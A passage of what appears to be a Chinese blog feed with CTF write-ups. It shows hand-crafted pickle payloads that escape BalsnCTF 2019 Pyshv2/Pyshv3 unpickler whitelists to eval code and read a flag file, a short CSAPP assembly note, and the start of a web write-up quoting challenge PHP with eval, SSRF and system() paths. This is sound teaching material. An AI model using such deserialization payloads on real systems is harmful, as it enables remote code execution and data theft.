class="string">'__builtins__'</span>)   <span class="comment"># 获取到字典，先存起来</span></span><br><span class="line">getattr(structs, <span class="string">'__import__'</span>) = getattr(structs, <span class="string">'__getattribute__'</span>)  <span class="comment"># 覆盖 __import__</span></span><br><span class="line">setattr(structs, <span class="string">'structs'</span>, d)   <span class="comment"># 创建个 structs 的属性，字典写入该属性</span></span><br><span class="line">mo = __import__(structs) <span class="comment"># 此时的 mo 就是我们之前的 __builtins__</span></span><br><span class="line">getattr(mo, <span class="string">'get'</span>)     <span class="comment"># 获取到 get 方法，然后就可以按照 pyshv1 的思路来了</span></span><br></pre></td></tr></table></figure><p>转换为 pickle：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line"><span class="number">0</span>cstructs</span><br><span class="line">__dict__</span><br><span class="line">S<span class="string">'structs'</span></span><br><span class="line">cstructs</span><br><span class="line">__builtins__<span class="meta"># 先添加 structs 属性</span></span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S<span class="string">'__import__'</span></span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S<span class="string">'eval'</span></span><br><span class="line">tR(S<span class="string">'print(open("../flag").read())'</span>   <span class="meta"># 这里已经不能 __import__(<span class="string">'os'</span>) 了，能继续执行命令吗：）</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">'su'</span>: self.cmd_su,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            print(<span class="string">'flag: Permission denied'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, group)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">''</span></span><br></pre></td></tr></table></figure><p><code>RestrictedUnpickler</code> 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。</p><p>注意到，在 <code>cmd_flag()</code> 中，<code>self.user.privileged</code> 只要就符合条件将输出 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = <span class="literal">False</span>  <span class="comment"># 这个有点猛，后面还有赋值，没法直接覆盖了</span></span><br></pre></td></tr></table></figure><p>魔术方法列表中可以看到，给属性赋值时，用的是 <code>__setattr__(self, name)</code>，能不能把这个干掉？</p><p>看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 <code>privileged</code> ，同时又不干扰 <code>flag</code>？</p><p>继续在魔术方法里寻找，突然看到了一个<code>创建描述符对象</code>里有 <code>__set__</code> 方法，会不会有点关系呢。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g80iq605w2j20hd0gcdgu.jpg" alt="image.png"></p><blockquote><p>属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，<code>a.x</code> 的查找顺序会从 <code>a.__dict__[&#39;x&#39;]</code> 开始，然后是 <code>type(a).__dict__[&#39;x&#39;]</code>，接下来依次查找 <code>type(a)</code> 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。 </p></blockquote><p>关于描述符的讲解还可以看下这文章：<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">https://foofish.net/what-is-descriptor-in-python.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RevealAccess</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval=None, name=<span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">'Retrieving'</span>, self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">'Updating'</span>, self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">'var "x"'</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">"x"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>可清楚的看到，对属性 <code>x</code> 的操作都被 “hook” 住了，而 <code>y</code> 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 <code>RevealAccess</code>，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line">print(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line">print(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line">print(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>把这个过程转为 pickle：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(<span class="name">I111</span></span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(<span class="name">N</span>&#125;S'__set__'</span><br><span class="line">g100</span><br><span class="line">sS'privileged'</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>看一下结果：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g81bht0kk3j20sr0ifwfr.jpg" alt="image.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 程序的机器级表示 笔记</title>
    <link href="https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/"/>
    <id>https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/</id>
    <published>2019-10-10T15:33:45.000Z</published>
    <updated>2019-10-13T15:20:19.292Z</updated>
    
    <content type="html"><![CDATA[<p>在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -0g -c hello.c  # 表示优化等级为最低，贴近原始汇编</span><br></pre></td></tr></table></figure><p>对于机器级编程来说，其中两种抽象尤为重要。</p><p>一个是机器级程序的格式和行为，定义为<strong>指令体系结构</strong>（Instruction Set Architecture，ISA ），它定义了处理器状态，指令的格式以及每条指令对状态的影响。大多数ISA,包括IA32和x86-64，将程序的行为描述成<strong>好像</strong>每条指令时顺序执行的。一条指令执行结束后，下一条指令开始执行。处理器的硬件远远比描述的精细复杂，它们能够并发的地执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行行为一致。</p><p>第二种抽象是，机器级程序使用的存储器地址是<strong>虚拟地址</strong>，提供的存储器模型看上去是一个非常大的字节数组。</p><p>在整个编译过程中，编译器会主要将C语言提供的相对抽象的执行模型表示的程序转化为处理器执行的非常基本的命令。汇编代码非常接近于机器代码。与机器码的二进制格式相比，汇编代码的一个主要特点是，<strong>它用可读性更好的文本格式来表示。</strong></p><p><strong>能够理解汇编代码以及它与原始C代码的联系，是理解计算机系统如何执行程序关键的一步。</strong></p><p>二三章还是没啥意思，以前都学过了，最近在看<em>程序员的自我修养</em>，真是一本好书，解决了很多我对底层的疑问，一定要多读几遍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Balsn CTF 2019 两道 web 题</title>
    <link href="https://wywwzjj.top/2019/10/06/BalsnCTF-2019-%E4%B8%A4%E9%81%93web%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/10/06/BalsnCTF-2019-两道web题/</id>
    <published>2019-10-06T02:21:58.000Z</published>
    <updated>2019-11-04T02:29:49.028Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><blockquote><p>常见绕过、gopher 打 MySQL、SSRF</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g7wblbfld6j20sf0artal.jpg" alt></p><p>一打开题目就能看到源码，稍稍有点混淆，整理一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Σ&gt;―(#°ω°#)♡→'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        @curl_setopt(</span><br><span class="line">            $ch,</span><br><span class="line">            CURLOPT_URL,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"int"</span>,</span><br><span class="line">                <span class="string">":DD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%69%6e%74"</span>,</span><br><span class="line">                    <span class="string">"XDDD"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">"%2e%2e"</span>,</span><br><span class="line">                        <span class="string">"Q___Q"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">".."</span>,</span><br><span class="line">                            <span class="string">"QAQ"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%33%33%61"</span>,</span><br><span class="line">                                <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"%63%3a"</span>,</span><br><span class="line">                                    <span class="string">"WTF"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"633a"</span>,</span><br><span class="line">                                        <span class="string">":)"</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"433a"</span>,</span><br><span class="line">                                            <span class="string">":("</span>,</span><br><span class="line">                                            str_repLace(</span><br><span class="line">                                                <span class="string">"\x63:"</span>,</span><br><span class="line">                                                <span class="string">"ggininder"</span>,</span><br><span class="line">                                                strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                            )</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">        @curl_EXEC($ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'⁣'</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码并不需要额外配置，却加载了一个 